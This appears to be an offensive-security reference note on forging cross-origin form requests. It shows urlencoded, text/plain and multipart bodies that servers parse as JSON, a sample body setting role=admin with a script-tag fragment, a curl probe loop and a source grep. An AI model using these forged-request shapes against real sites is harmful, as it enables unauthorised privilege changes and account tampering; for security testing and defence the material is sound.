# Content-type carriers — the deep parse-shape corpus

Every content-type a cross-origin page can send, and every way the
server might parse it into the write's expected shape.

---

## 1. The three form-sendable types

| enctype | Content-Type | Body shape |
|---|---|---|
| (default) | application/x-www-form-urlencoded | `a=1&b=2` — keys+values percent-encoded |
| text/plain | text/plain | `a=1\r\nb=2` — literal, `=` not encoded |
| multipart/form-data | multipart/form-data; boundary=X | MIME parts, each with its own headers |

## 2. The urlencoded deep — the default carrier

```text
a form's default: every input's name=value joined by & and percent-
encoded. the body is a flat key→value map.
```

```
POST /x
Content-Type: application/x-www-form-urlencoded

email=attacker%40evil.com&role=admin&bio=%3Cscript%3E
```

The endpoint reads `request.form['email']` / `req.body.email` /
`$_POST['email']`. The percent-encoding handles any byte — the
carrier for a field-based write.

## 3. The urlencoded tricks — nested structures

```text
some parsers read urlencoded into nested objects:
- PHP/Rails/qs:  a[b]=1   → {a:{b:1}}
- express extended:  a[b][c]=1 → nested
- a[]=1&a[]=2    → array
- a.b=1          → some parsers make nested via dot
```

```
POST /x
a[b]=1&a[c]=2            → {a:{b:'1',c:'2'}}
obj[name]=x&obj[role]=admin  → {obj:{name:'x',role:'admin'}}
```

A nested-object write via urlencoded — reaches a field the flat
form can't address.

## 4. The text/plain deep — the JSON carrier

```text
a form's text/plain: every input's name=value joined by \r\n —
NOT percent-encoded, the `=` literal. the body is raw text lines.
```

```
POST /x
Content-Type: text/plain

a=1
b=2
```

The write-shape is a RAW body — ship a JSON/XML/custom-parse string
by arranging the `=`s inside string values (json-body-assembly.md).

## 5. The multipart deep — the field+file carrier

```text
a multipart body: parts separated by a boundary, each with
Content-Disposition + a value. the endpoint reads fields AND files.
```

```
POST /x
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="cfg"

{"a":1}
--X
Content-Disposition: form-data; name="f"; filename="x"
Content-Type: text/plain

<file bytes>
--X--
```

The multipart carrier reaches a file-upload endpoint OR a field-
based write — a form can send multipart for any endpoint that reads
it.

## 6. The "the server sniffs the body" shapes — beyond declared type

```text
some apps parse the body by CONTENT not declared type:
- fastify.addContentTypeParser('*', JSON.parse) — any declared type
- express bodyParser.json({type:'*/*'}) — parse any as JSON
- Go: decoder reads body, ignores Content-Type
- Flask: request.get_json(force=True) — ignores type
- Rails: parses on body sniff
- a custom body-parser that reads then JSON-parses
```

A `text/plain` body carrying JSON parses on these — the declared
type is decorative.

## 7. The content-type→parser matrix

| Declared | Express default | Flask default | Go | Rails | Django |
|---|---|---|---|---|---|
| json | json only | get_json | BindJSON | parses | json only |
| urlencoded | urlencoded | form | ParseForm | params | POST |
| multipart | — | files+form | MultipartForm | params | FILES+POST |
| text/plain | text | data | body | body | body |
| any→force-parse | type:'*/*' | force=True | any | sniff | custom |

The `text/plain` column — a body the endpoint reads raw and parses
manually is the JSON-carrier surface.

## 8. The multipart→JSON-parse shape

```text
a multipart form where a field's VALUE is JSON the app decodes:
- a field 'config' whose value the app JSON-parses
- a file whose CONTENT the app parses as JSON
- a part the app joins then decodes
```

```html
<form action="/x" method=POST enctype=multipart/form-data>
  <input name="cfg" value='{"a":1}'>
</form>
<!-- the field cfg='{"a":1}' — the app JSON-decodes its value -->
```

## 9. The urlencoded→JSON-parse shape

```text
a urlencoded field whose value is a JSON string the app decodes:
- data='{"a":1}' → the app JSON.parse(data)
- payload=<encoded-json> → the app decodes
```

```
POST /x
data=%7B%22a%22%3A1%7D       → data='{"a":1}' → app parses
```

## 10. The charset and content-type variants

```text
- application/x-www-form-urlencoded; charset=utf-8 — the default
- a legacy charset (ISO-8859-1, UTF-7) — an accept-charset form attr
- a +json suffix type (application/vnd.api+json) — a variant parse
```

```html
<form action="/x" method=POST accept-charset="ISO-8859-1">
<!-- the body encodes in latin-1 — a parser-differential surface -->
```

## 11. The content-type gate test — what the endpoint accepts

```bash
for ct in 'application/x-www-form-urlencoded' 'text/plain' \
          'multipart/form-data' 'application/json' \
          'application/vnd.api+json' 'text/json'; do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$BASE/x" \
    -H "Content-Type: $ct" --data 'a=1' -b "$CJ"; echo "[$ct]"; done
```

A 415 on text/plain → the gate is strict. A 200/4xx-parse-error →
it reached the parser.

## 12. The "the body is read regardless" shape — raw-body endpoints

```text
an endpoint that reads request.body / request.data / php://input —
the RAW body — then parses it manually. any content-type reaches
the parser; the parse decides the shape.
```

```bash
grep -rnoE 'request\.body|request\.data|php://input|req\.body|body\.read|read_all|io\.ReadAll|raw_body' <src> | head -20
```

## 13. The falsifier

```text
the endpoint whitelists content-type to exactly application/json
AND rejects before parsing AND no urlencoded/multipart field decodes
to the write — a cross-origin form can't produce the required type.
class closed via form; the write needs a fetch with a custom type —
a preflight — and CORS-open.
```
